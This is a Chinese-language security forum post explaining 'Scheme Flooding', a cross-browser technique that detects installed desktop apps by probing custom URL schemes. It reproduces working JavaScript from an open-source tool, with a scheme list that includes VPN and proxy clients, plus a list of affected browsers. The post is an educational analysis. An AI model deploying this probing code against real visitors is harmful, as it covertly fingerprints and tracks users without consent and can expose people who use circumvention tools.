![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e065ffe938dd4120588180f0dd48988d2b4ee908.png)

0x00 简介
=======

Scheme Flooding 的直译叫做「方案泛洪」漏洞，但是以这个关键词拿到百度搜索搜不出啥有用的东西，下文就以 Scheme Flooding 直接表示了，本文将从 效果-成因-反制 三个角度对此技术进行浅析，由于本人也是第一次接触这个漏洞类型，对我也是从零到一的过程，可能会存在错误，望各位师傅斧正，可以加**本人微信：liyi19960723**讨论

0x01 漏洞效果
=========

其实严格来说我觉得 Scheme Flooding 并不是是个合格的「漏洞」，而更像是对 Scheme 特性的一种「变态」利用，说到这里可能大家还不知道什么是 Scheme Flooding ，为了用户使用体验，许多厂商会选择在一些页面对本地应用进行快速调起，就是百度网盘等各类网盘应用在下载时会提示是否打开的那个功能

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-84bd4fbbc8cb72f5e0bf33ee30c46a27487766f3.png)

正常来说我们使用的时候都会弹出一个提醒框，但是我们可以饶过此限制批量来调起一些已知的指纹，大家可以在这两个网站看一下效果，会在 Chrome 中单独弹出一个小窗来进行批量探测

增加国内软件指纹：<https://tomapu.github.io/schemeflood/>

四大浏览器均可：<https://schemeflood.com/>

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-81bba1bff52dd9ba263b7b8fab2a91b26e985f3d.png)

以下是两个网站我的结果，基本上有特征的软件探测都很准确，测试的时候不要进行其他操作，会打断小窗的探测造成效果不准确

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-54166ffd941d228e49736d2bd58d1725e7313409.png)

0x02 漏洞成因
=========

什么是 Scheme
----------

上文提到 Scheme Flooding 是 Scheme 特性的一种变态利用，那么 Scheme 是什么呢？

简单来说，Scheme 是一种页面内跳转协议，通过自定义 Scheme 协议可以方便跳转到各类软件，在Android 中应用更加广泛，可以非常方便跳转 App 中的各个页面，在以下场景应用很广泛：

```php
1.通过小程序，利用Scheme协议打开原生App
2.H5页面点击锚点，根据锚点具体跳转路径APP端跳转具体的页面
3.APP端收到服务器端下发的PUSH通知栏消息，根据消息的点击跳转路径跳转相关页面
4.APP根据URL跳转到另外一个APP指定页面
5.通过短信息中的url打开原生app
```

想知道更多可以通过 `Google Git`上关于 Scheme 的源码来进行深层次学习：[https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/browser/external\_protocol/external\_protocol\_handler.h#125](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/browser/external_protocol/external_protocol_handler.h#125)

漏洞基础利用
------

漏洞利用我找到了两个开源项目  
一个是 **Fingerprint** 安全公司开源的一套检测工具：

```php
https://github.com/fingerprintjs/external-protocol-flooding
```

另外一个是 **drivertom** 师傅写的一个更为简洁的工具：

```php
https://github.com/TomAPU/schemeflood
```

下面我以 **drivertom** 的开源项目的核心代码在 Chrome 环境下进行基本利用思路的讲解

首先创建了一个新页面，产生的效果就是刚才启动检测时右下角的小框

```html
handler = window.open('about:blank', '', 'width=50,height=50,left=9999,top=9999')
```

之后引入了 `appnames` 和 `schemes` 两个数据组

```html
appnames=['Skype', 'Spotify', 'Zoom', 'vscode', 'Epic Games', 'Telegram', 'Discord', 'Slack', 'Steam', 'Battle.net', 'Xcode', 'NordVPN', 'Sketch', 'Teamviewer', 'Microsoft Word', 'WhatsApp', 'Postman', 'Adobe', 'Messenger', 'Figma', 'Hotspot Shield', 'ExpressVPN', 'Notion', 'iTunes','Tim','百度网盘','BinaryNinja','evernote','github desktop','onenote','QQ','腾讯会议','xmind','Vmware','360软件管家','acrobat','QQ游戏','shadowsocks','shadowsocksr','v2ray','trojan','naiveproxy','brook','V2rayU']
schemes=['skype', 'spotify', 'zoommtg', 'vscode', 'com.epicgames.launcher', 'tg', 'discord', 'slack', 'steam', 'battlenet', 'xcode', 'nordvpn', 'sketch', 'teamviewerapi', 'word', 'whatsapp', 'postman', 'aem-asset', 'messenger', 'figma', 'hotspotshield', 'expressvpn', 'notion', 'itunes','Tencent','Baiduyunguanjia','BinaryNinja','evernote','github-windows','onenote','QQ','wwauth3rd3a82ac41e00d815d','xmind','vm','softmanager360','acrobat','QQGameProtocol','ss','ssr','vmess','trojan','naive+https','brook','clash']
```

`appnames` 为检测应用名称，`schemes` 我们可以理解为「特征」，例如我们在浏览器搜索框中搜索 `skype://` 则会出现是否打开 Skype ，由此可见 `appnames` 与 `schemes` 是相对应的

最后**通过遍历所有「特征」对本地安装软件的有效 Schemes 进行匹配**，从而实现对本地安装软件痕迹探测，包括一些已卸载的软件卸载时并没有删除 Schemes 路径，所以有些已删除的软件也可被此工具探测出来，完成以上任务后关闭刚才新建的窗口

```html
for(var i=0;i<appnames.length;i++)
        {
            appname=appnames[i];
            scheme=schemes[i];
            let isDetected=true;
            await sleep(125) 
            input = document.createElement('input')
            input.style.opacity = '0'
            input.style.position = 'absolute'
            input.onfocus = () => { isDetected = false }
            await sleep(125) 
            handler.document.body.appendChild(input);
            handler.location.replace(scheme+"://Message")
            await sleep(125) 
            input.focus()
            await sleep(125)
            input.remove()
            if(isDetected)
                output=document.getElementById('installed')
            else 
                output=document.getElementById('notinstall')
            output.value+='\n'+appname
            handler.location.replace("about:blank")
        }
        handler.close()
```

还有一个通过 CORS 饶过浏览器限制的方法，但是我还没理解是啥意思，以后理解了再单独写一篇文章出来

哪些浏览器&amp;系统收到影响
----------------

根据 Fingerprint 公开的数据表示，以下浏览器&amp;系统受此漏洞影响：

- **Chrome** 90 (Windows 10, macOS Big Sur)
- **Firefox** 88.0.1 (Ubuntu 20.04, Windows 10, macOS Big Sur)
- **Safari** 14.1 (macOS Big Sur)
- **Tor Browser** 10.0.16 (Ubuntu 20.04, Windows 10, macOS Big Sur)
- **Brave** 1.24.84 (Windows 10, macOS Big Sur)
- **Yandex Browser** 21.3.0 (Windows 10, macOS Big Sur)
- **Microsoft Edge** 90 (Windows 10, macOS Big Sur)

Tor 浏览器已经在 `Attachment #9276130` 修复了此漏洞，但不排除以其他方式饶过的可能性，其他浏览器也已经发现此问题，但在公开版本中此漏洞仍然有效

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-13b4e8fa2f8002851902292d06f64979e180ccd7.png)

如何找到这些「特征」
----------

在漏洞基础利用中的开源项目创建了`schemes` 这个数据组，`schemes` 便是「特征」，这里我以百度网盘为例子演示如何获取应用的「特征」

1. 随便找到一个资源（这里我找了一部电影，一般小的文件会直接调用浏览器下载）

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-718e46fe61db8fce6f4c939528a05e13b9b77de0.png)

1. 点击【下载】，上方就会提示要打开 `baiduyunguanjia` 连接，`baiduyunguanjia` 即为「特征」，这里建议使用火狐浏览器，使用 Chrome 不显示打开 baiduyunguanjia 连接

![](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-87d5fd5e1a8df3ba51cf975926ab0a7809aaaeaa.png)

其他应用只要找到可以**调起相应应用的页面**也可以以相同方法找到「特征」

0x03 总结
=======

本来这篇文章还想多说一些的内容的，例如通过 CORS 饶过浏览器限制的方法、红蓝对抗中的利用方法等，奈何本人基础知识太薄弱了，写不出深度，就先不写出来丢人了，想要深入了解可以去看 Fingerprint 的那篇文章，我这篇仅作为一篇科普和原理的浅析，有错误大家多多批评

0x04 引用
=======

1. **Exploiting custom protocol handlers for cross-browser tracking —— Fingerprint**
2. **Scheme协议详细介绍 —— 杨充**
3. **schemeflood —— drivertom（twitter@drivertomtt）**